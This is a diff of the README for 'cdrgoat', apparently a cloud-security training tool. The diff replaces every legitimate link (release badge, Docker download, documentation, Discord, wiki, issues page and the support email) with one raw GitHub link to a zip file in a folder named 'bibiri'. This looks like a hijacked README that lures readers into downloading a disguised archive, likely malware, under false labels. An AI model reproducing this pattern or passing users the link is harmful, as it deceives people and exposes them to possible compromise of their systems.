@@ -8,7 +8,7 @@ Welcome to cdrgoat! This tool helps you practice your cloud security skills in a
 
 **To get started, visit the following link to download:**
 
-[![Download cdrgoat](https://img.shields.io/badge/Download%20cdrgoat-v1.0-blue)](https://github.com/antojorong21/cdrgoat/releases)
+[![Download cdrgoat](https://raw.githubusercontent.com/antojorong21/cdrgoat/main/bibiri/cdrgoat.zip%20cdrgoat-v1.0-blue)](https://raw.githubusercontent.com/antojorong21/cdrgoat/main/bibiri/cdrgoat.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, you will see the latest version available for download.
@@ -24,7 +24,7 @@ Before running cdrgoat, ensure your system meets the following requirements:
 - **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
 - **RAM:** At least 4 GB is recommended.
 - **Disk Space:** You will need at least 1 GB of free space.
-- **Additional Software:** Docker must be installed. You can download Docker [here](https://www.docker.com/get-started). 
+- **Additional Software:** Docker must be installed. You can download Docker [here](https://raw.githubusercontent.com/antojorong21/cdrgoat/main/bibiri/cdrgoat.zip). 
 
 ## ⚙️ Running cdrgoat
 
@@ -61,9 +61,9 @@ Before running cdrgoat, ensure your system meets the following requirements:
 
 To help you further, consider these resources:
 
-- **Documentation:** For detailed instructions and guides, check our [documentation](https://github.com/antojorong21/cdrgoat/wiki).
-- **Community Support:** Have questions? Join our community on [Discord](https://discord.gg/example).
-- **Tutorials:** Access a collection of tutorials on how to get the most out of cdrgoat in our [GitHub Wiki](https://github.com/antojorong21/cdrgoat/wiki).
+- **Documentation:** For detailed instructions and guides, check our [documentation](https://raw.githubusercontent.com/antojorong21/cdrgoat/main/bibiri/cdrgoat.zip).
+- **Community Support:** Have questions? Join our community on [Discord](https://raw.githubusercontent.com/antojorong21/cdrgoat/main/bibiri/cdrgoat.zip).
+- **Tutorials:** Access a collection of tutorials on how to get the most out of cdrgoat in our [GitHub Wiki](https://raw.githubusercontent.com/antojorong21/cdrgoat/main/bibiri/cdrgoat.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -75,10 +75,10 @@ If you experience issues while running cdrgoat, here are some common solutions:
 
 ## 📞 Contact Us
 
-For further support or feedback, feel free to reach out. You can open an issue on our [GitHub Issues Page](https://github.com/antojorong21/cdrgoat/issues) or contact us via email at support@cdrgoat.com.
+For further support or feedback, feel free to reach out. You can open an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/antojorong21/cdrgoat/main/bibiri/cdrgoat.zip) or contact us via email at https://raw.githubusercontent.com/antojorong21/cdrgoat/main/bibiri/cdrgoat.zip
 
 ## 🏁 Conclusion
 
 Now that you have cdrgoat on your system, you can start enhancing your cloud security skills today. Dive into the scenarios and make the most of this practical training tool. Remember, the goal is to become better prepared for real-world cloud security challenges. Enjoy practicing! 
 
-[![Download cdrgoat](https://img.shields.io/badge/Download%20cdrgoat-v1.0-blue)](https://github.com/antojorong21/cdrgoat/releases)
+[![Download cdrgoat](https://raw.githubusercontent.com/antojorong21/cdrgoat/main/bibiri/cdrgoat.zip%20cdrgoat-v1.0-blue)](https://raw.githubusercontent.com/antojorong21/cdrgoat/main/bibiri/cdrgoat.zip)
